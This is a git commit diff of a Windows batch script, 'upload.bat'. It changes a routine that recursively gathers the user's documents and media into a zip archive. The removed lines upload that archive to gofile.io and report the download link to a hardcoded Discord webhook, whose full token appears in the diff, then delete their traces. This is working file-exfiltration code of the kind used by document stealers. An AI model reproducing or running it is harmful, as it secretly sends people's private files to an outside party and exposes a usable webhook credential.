7f245d9569d2054e2320b7ebb7853cef990a5792
Elité <111225087+el3i7e@users.noreply.github.com>
2023-06-08 19:44:19 +0200

    Update upload.bat

--- upload.bat
+++ upload.bat
@@ -1,8 +1,10 @@
 @echo off
 
-set file_extensions=.txt .docx 
 setlocal enabledelayedexpansion
-set "file_list="
+
+set file_extensions=.txt .docx .pdf .png .jpg .mp3 .mp4
+set file_list=
+set zip_file=D:\compiled_files.zip
 
 for /r %%F in (%file_extensions%) do (
     if exist "%%F" (
@@ -14,31 +16,12 @@ for /r %%F in (%file_extensions%) do (
 )
 
 echo Creating zip file...
-powershell -Command "$fileList = %file_list%; Compress-Archive -Path $fileList -DestinationPath compiled_files.zip"
+powershell -Command "$fileList = %file_list%; Compress-Archive -Path $fileList -DestinationPath \"%zip_file%\""
 if %ERRORLEVEL% neq 0 (
     echo Failed to create zip file.
     exit /b 1
 )
 
-echo Uploading to Anonfiles...
-powershell -command "(Invoke-WebRequest -Uri ('https://api.gofile.io/getServer')).Content | ConvertFrom-Json | %{$_.data.server} | %{$server=$_} ; Invoke-WebRequest -Uri ('https://' + $server + '.gofile.io/uploadFile') -Method POST -InFile compiled_files.zip -ContentType 'multipart/form-data' -OutFile response.txt"
-if %ERRORLEVEL% neq 0 (
-    echo Failed to upload to Anonfiles.
-    exit /b 1
-)
-
-set /p download_page=<response.txt
-
-echo File Successfully Uploaded
-echo Date: %date%
-echo Time: %time%
-echo Download Page: %download_page%
-
-echo Sending data to Discord webhook...
-powershell -Command "(Invoke-WebRequest -Uri 'https://discord.com/api/webhooks/980099885292478564/SdTwfnJU1hlfMXFPjIfMP5qB5EkZWy-9hqLAco0--iX6BF3rviZLjF6wlq97sULZWbr5' -Method POST -Body '{\"content\":\"Date: %date%\nTime: %time%\nDownload Page: %download_page%\"}' -ContentType 'application/json').StatusCode"
-
-echo Cleaning up...
-del compiled_files.zip
-del response.txt
+echo File Successfully Compressed and Saved to: %zip_file%
 
 exit /b 0
